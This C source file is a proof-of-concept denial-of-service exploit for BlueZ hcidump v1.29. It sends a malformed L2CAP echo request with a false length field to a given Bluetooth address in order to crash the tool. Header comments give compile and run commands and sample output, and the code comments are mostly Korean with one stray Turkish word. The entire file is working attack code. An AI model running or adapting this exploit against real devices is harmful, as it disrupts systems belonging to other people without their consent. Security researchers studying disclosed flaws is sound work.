/*	Bluez hcidump v1.29 DoS - PoC code			*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*	01/18/06						*/
/*	Crashes hcidump sending bad L2CAP packet		*/
/*								*/
/*	gcc -lbluetooth hcidump-crash.c -o hcidump-crash	*/
/*	./hcidump-crash 00:80:37:XX:XX:XX			*/
/*	L2CAP packet sent (15)					*/
/*	Buffer: 08 01 0C 00 41 41 41 41 41 41 41 41 41 41 41	*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		15
#define FAKE_SIZE	12

// 메인 함수
int main(int argc, char **argv)
{
    // 버퍼와 명령 헤더를 선언
    char *buffer;
    l2cap_cmd_hdr *cmd;    
    // L2CAP 주소 구조체
    struct sockaddr_l2 addr;
    // 소켓, 전송 자리, 반복 변수
    int sock, sent, i;

    // 명령줄 인수가 yeterli하지 않을 때
    if(argc < 2)
    {
        fprintf(stderr, "%s <btaddr>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    // 소켓을 생성
    if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // addr 구조체를 초기화
    memset(&addr, 0, sizeof(addr));
    addr.l2_family = AF_BLUETOOTH;

    // addr 구조체에 바인딩
    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
    {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    // argv[1]을  Bluetooth 주소로 변환
    str2ba(argv[1], &addr.l2_bdaddr);
    
    // 소켓에 연결
    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
    {
        perror("connect");
        exit(EXIT_FAILURE);
    }

    // 버퍼를 할당
    if(!(buffer = (char *) malloc ((int) SIZE + 1))) 
    {
        perror("malloc");
        exit(EXIT_FAILURE);
    }
    
    // 버퍼에 'A'를 채움
    memset(buffer, 'A', SIZE);

    // 명령 헤더를 생성
    cmd = (l2cap_cmd_hdr *) buffer;
    cmd->code = L2CAP_ECHO_REQ;
    cmd->ident = 1;
    cmd->len = FAKE_SIZE;
    
    // 버퍼를 전송
    if( (sent=send(sock, buffer, SIZE, 0)) >= 0)
    {
        printf("L2CAP packet sent (%d)\n", sent);
    }

    // 전송 됐을 때 버퍼를 출력
    printf("Buffer:\t");
    for(i=0; i<sent; i++)
        printf("%.2X ", (unsigned char) buffer[i]);
    printf("\n");

    // 버퍼를 해제
    free(buffer);
    // 소켓을 닫음
    close(sock);
    return EXIT_SUCCESS;
}
